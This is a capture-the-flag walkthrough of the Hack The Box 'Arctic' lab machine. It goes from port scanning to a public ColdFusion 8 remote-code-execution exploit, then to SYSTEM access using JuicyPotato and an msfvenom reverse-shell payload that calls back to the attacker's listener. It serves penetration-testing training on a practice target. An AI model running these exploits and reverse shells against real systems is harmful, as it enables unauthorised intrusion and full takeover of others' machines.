---
title: "HTB Arctic"
permalink: /writeups/arctic
location: default
---

# HTB Arctic

**Machine Information**

	IP : 10.10.10.11
	OS : Windows

### Reconnaissance

**Rustscan**

Start by running a port scan using `rustscan`.

```
rustscan -a 10.10.10.11 -- -sC -sV -Pn
```

This should reveal three open ports: `135`, `8500`, and `49154`

```
PORT      STATE SERVICE REASON  VERSION
135/tcp   open  msrpc   syn-ack Microsoft Windows RPC
8500/tcp  open  fmtp?   syn-ack
49154/tcp open  msrpc   syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Investigate each of the ports and there should be a web server running on port 8500.

> http://10.10.10.11:8500/

The default page is an `Index of /` and allows directory listing so we can explore the available files. Exploring the directories will reveal an Adobe ColdFusion 8 Administrator panel at the following location:

> http://10.10.10.11:8500/CFIDE/administrator/

### Getting a Foothold

**Adobe ColdFusion Exploit**

Check for known exploits using `searchsploit`.

```
searchsploit coldfusion 8
```

This will reveal a python script that we can use for remote code execution.

```
Adobe ColdFusion 8 - Remote Command Execution (RCE) | cfm/webapps/50057.py
```

> https://www.exploit-db.com/exploits/50057

Open the exploit and update the `LHOST`, `LPORT`, and `RHOST` parameters to the appropriate values. Start a new `netcat` listener and run the exploit.

```
python3 50057.py
```

Success!

```
C:\ColdFusion8\runtime\bin>whoami
arctic\tolis
```

The user flag can be found in the following directory:

```
C:\Users\tolis\Desktop\user.txt
```

### Privilege Escalation

Checking our users privileges with `whoami /priv` reveals that we have the `SeImpersonatePrivilege` which may be exploitable.

```
Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

For this we need to upload the `JuicyPotato.exe` exploit that can be downloaded from the following link:

> https://github.com/ohpe/juicy-potato/releases/tag/v0.1

We will also need a reverse shell payload that can be generated using `msfvenom`.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9001 -f exe > shelly.exe
```

Once both of these are on the target machine start a new `netcat` listener and run the exploit.

```
.\JuicyPotato.exe -t t -p .\shelly.exe -l 5837
```

Success!

```
C:\Windows\system32>whoami
nt authority\system
```

The root flag can be found in the following directory:

```
C:\Users\Administrator\Desktop\root.txt
```
